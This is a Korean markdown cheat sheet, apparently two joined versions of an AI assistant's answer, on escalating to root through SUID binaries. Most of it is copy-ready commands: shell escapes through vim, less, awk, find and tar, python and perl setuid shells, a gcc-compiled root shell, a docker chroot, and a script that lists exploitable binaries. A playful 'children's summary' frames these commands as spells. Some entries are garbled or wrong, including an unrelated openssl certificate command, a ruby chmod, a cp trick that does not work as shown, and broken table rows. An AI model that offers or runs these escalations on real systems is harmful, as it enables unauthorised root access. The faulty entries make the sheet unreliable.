# SUID 바이너리를 이용한 권한 상승 기법

> SUID(Set User ID) 바이너리를 활용한 권한 상승 기법을 체계적으로 정리한 문서입니다.

## 📋 목차
1. [기본 개념](#기본-개념)
2. [바이너리별 공격 기법](#바이너리별-공격-기법)
3. [권장 테스트 순서](#권장-테스트-순서)
4. [팁과 주의사항](#팁과-주의사항)

---

## 기본 개념

**SUID(Set User ID)** 권한이 설정된 파일은 실행 시 파일 소유자의 권한으로 실행됩니다. 이러한 파일이 root 소유라면, 일반 사용자가 해당 파일을 실행할 때 root 권한으로 실행할 수 있어 권한 상승에 활용할 수 있습니다.

### 🔍 SUID 파일 식별 방법

**1. SUID 파일 찾기:**
```bash
# 시스템 내 모든 SUID 파일 찾기
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 간단하게 목록만 보기
find / -perm -4000 -type f 2>/dev/null
```

**2. 권한 상승 가능성 분석:**

```bash
# 소유자 및 권한 확인
ls -l /경로/파일명

# 파일 유형 분석
file /경로/파일명

# 내부 문자열 검사
strings /경로/파일명 | grep -i "sh\|bash\|system"

# 라이브러리 의존성 확인
ldd /경로/파일명
```

**확인 포인트:**
- 소유자가 `root`인가? 
- 권한에 **s 비트**가 있는가? (예: `-rwsr-xr-x`)
- 실행 가능한 바이너리인가?
- 쉘 명령어나 위험한 함수를 포함하고 있는가?

## 바이너리별 공격 기법

SUID 바이너리 유형에 따라 다양한 권한 상승 기법을 적용할 수 있습니다. 아래는 바이너리 종류별로 정리한 공격 기법입니다.

### 🔸 쉘 및 기본 도구

| 바이너리 | 명령어 | 설명 |
|---------|--------|------|
| `bash` | ```/bin/bash -p``` | `-p` 옵션으로 SUID 권한 보존 |
| `find` | ```find . -exec /bin/sh \; -quit``` | `-exec` 옵션으로 명령 실행 |
| `env` | ```env /bin/sh``` | 환경변수 설정 도구로 쉘 실행 |
| `awk` | ```awk 'BEGIN {system("/bin/sh")}'``` | awk 내에서 시스템 함수 호출 |
| `cp` | ```cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh``` | SUID 비트 설정된 쉘 복사 |

---

#### ✅ 인터랙티브 명령어 쉘 진입

| 파일명          | 명령어                       |
| --------------- | ---------------------------- |
| `vim`           | `vim -c ':!sh'`              |
| `less`          | `less /etc/passwd` → `!sh`   |
| `more`          | `more /etc/passwd` → `!sh`   |
| `man`           | `man man` → `!sh`            |
| `nmap` (구버전) | `nmap --interactive` → `!sh` |

---

#### ✅ 빌드형 루트 쉘 생성

| 파일명 | 명령어                                                                         |
| ------ | ------------------------------------------------------------------------------ |
| `gcc`  | `echo 'int main(){setuid(0);system("/bin/sh");}' > r.c && gcc r.c -o r && ./r` |

---

#### ✅ 고급 활용 / 특수 상황

| 파일명             | 명령어                                                                         |
| ------------------ | ------------------------------------------------------------------------------ |
| `tar`              | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`   |
| `docker`           | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` _(docker group 포함 시)_ |
| `screen (v4.5.0-)` | `screen -D -m -L bash` _(구버전 권한 상승 취약점)_                             |

---

### 3. 🧪 권한 상승 스크립트 예시 (수동)

```bash
#!/bin/bash
echo "[+] SUID 파일 수집 중..."
find / -perm -4000 -type f 2>/dev/null | tee suid_list.txt

echo "[+] root 소유자만 필터링:"
cat suid_list.txt | xargs -I{} ls -l {} | grep '^-rws.* root'

echo "[+] 권한 상승 시도 가능한 바이너리:"
grep -E 'find|bash|python|perl|awk|env|vim|less|more|nmap|cp|tar' suid_list.txt
```

---

### 4. 📌 핵심 요약

- **SUID 권한 상승 여부 판단 4단계**:

  1. 소유자가 `root`인지 (`ls -l`)
  2. 실행파일인지 (`file`)
  3. 쉘 호출 가능 여부 (`strings`)
  4. 외부 라이브러리 의존 여부 (`ldd`)

- **익스플로잇 시도 우선순위**:

  1. 쉘 직접 실행 (`bash -p`, `find`, `python`)
  2. 인터랙티브 쉘 (`vim`, `less`, `nmap`)
  3. 복사 후 `chmod +s`
  4. 컴파일형 쉘 (`gcc`)
  5. 특수 명령 (`tar`, `docker`, `screen`)

---

### 5. 🧒 어린이 요약

> “관리자가 만든 특수 프로그램(SUID)을 잘 살펴보면, 내가 관리자처럼 행동할 수 있는 비밀 통로가 있어요. 그 문을 여는 마법 주문(명령어)을 잘 쓰면 ‘루트 권한’을 얻을 수 있죠!”

---

필요하시면 `find` 명령으로 발견한 SUID 파일 목록을 주시면, 어떤 게 실제로 권한 상승 가능한지 구체적으로 분석해드릴게요!

# SUID 바이너리를 이용한 권한 상승 기법

> SUID 바이너리를 발견했을 때 활용할 수 있는 다양한 권한 상승 기법을 정리한 문서입니다.

## 📋 목차

1. [기본 개념](#기본-개념)
2. [바이너리별 공격 기법](#바이너리별-공격-기법)
3. [권장 테스트 순서](#권장-테스트-순서)
4. [팁과 주의사항](#팁과-주의사항)

## 기본 개념

**SUID(Set User ID)** 권한이 설정된 파일은 실행 시 파일 소유자의 권한으로 실행됩니다. 이러한 파일이 root 소유라면, 일반 사용자가 해당 파일을 실행할 때 root 권한으로 실행할 수 있어 권한 상승에 활용할 수 있습니다.

SUID 파일 확인 명령어:

```bash
# 시스템 내 모든 SUID 파일 찾기
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

## 바이너리별 공격 기법

### 🔸 프로그래밍 언어 인터프리터

| 바이너리 | 명령어                                                                | 설명                             |
| -------- | --------------------------------------------------------------------- | -------------------------------- |
| `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`           | 루트 UID 설정 후 쉘 실행         |
| `perl`   | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'`                     | POSIX 모듈 사용하여 루트 쉘 실행 |
| `ruby`   | `ruby -e 'require "fileutils"; FileUtils.chmod(0700, "/etc/shadow")'` | 파일 권한 변경                   |

### 🔸 쉘 및 명령어 실행 도구

| 2 | `python` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` | 루트 UID 설정 후 쉘 |
| 3 | `perl` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'` | 루트 쉘 실행 |
| 4 | `bash` | `/bin/bash -p` | `-p`: SUID 보존 쉘 실행 |
| 5 | `cp` | `cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh` | 루트 쉘 복사 & SUID 설정 |
| 6 | `env` | `env /bin/sh` | `env`로 쉘 실행 |
| 7 | `vim` | `vim -c ':!sh'` | vim 명령어로 쉘 실행 |
| 8 | `less` | `less /etc/passwd`, `!sh` | `!` 명령어로 쉘 실행 |
| 9 | `more` | `more /etc/passwd`, `!sh` | 마찬가지로 `!sh` |
| 10 | `nmap` (구버전) | `nmap --interactive` → `!sh` | interactive 모드 쉘 실행 |
| 11 | `awk` | `awk 'BEGIN {system("/bin/sh")}'` | awk 내장 쉘 실행 |
| 12 | `man` | `man man` → `!sh` | `less` 내장, `!`로 쉘 |
| 13 | `tar` | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | 체크포인트로 쉘 실행 |
| 14 | `openssl` | `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes -subj '/' -config <(echo '[req]'; echo 'distinguished_name=req'; echo '[req_ext]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_req]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_ca]'; echo 'subjectAltName=DNS:localhost'; echo '[v3_ca]'; echo 'extendedKeyUsage=serverAuth, clientAuth'; echo 'basicConstraints=CA:TRUE'; echo 'keyUsage = keyCertSign, cRLSign'; echo '[ca]'; echo 'default_ca = CA_default'; echo '[CA_default]'; echo 'dir = ./demoCA'; echo 'certificate = ./demoCA/cacert.pem'; echo 'private_key = ./demoCA/private/cakey.pem'; echo 'new_certs_dir = ./demoCA/newcerts'; echo 'database = ./demoCA/index.txt'; echo 'serial = ./demoCA/serial'; echo 'crlnumber = ./demoCA/crlnumber'; echo 'RANDFILE = ./demoCA/private/.rand'; echo 'x509_extensions = v3_ca'; echo '[usr_cert]'; echo 'subjectAltName=DNS:localhost')` | openssl로 root 파일 작성 가능성 (복잡함) |
| 15 | `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | 루트 컨테이너 권한 (docker group) |
| 16 | `screen` (4.5.0 이하) | `screen -D -m -L bash` | 특정 버전에서 권한 상승 |
| 17 | `gcc` | `echo 'int main(){setuid(0);system("/bin/sh");}' > r.c && gcc r.c -o r && ./r` | 직접 루트 쉘 생성 |

---

## 🧪 테스트 순서 추천

1. 간단한 명령어 (`bash -p`, `find`, `python`)부터 시도
2. interactive 방식 (`vim`, `nmap`)
3. 복사해서 SUID 주는 방법 (`cp`, `chmod +s`)
4. 취약 버전(`screen`, `nmap`) 체크
5. 컨테이너, 권한 파일 작성 등 고급 방식

---

## 📌 팁

- 대부분 SUID는 `/usr/bin`, `/bin`, `/usr/local/bin`에 존재
- `ls -l`로 **owner가 root인지 반드시 확인**
- `strings`, `ldd`, `file`로 내부 확인하여 쉘 실행 여부 분석 가능

---

더 필요한 파일이나 결과 있으면 알려주세요. 해당 파일로 구체적인 권한 상승 방법도 도와드릴게요.
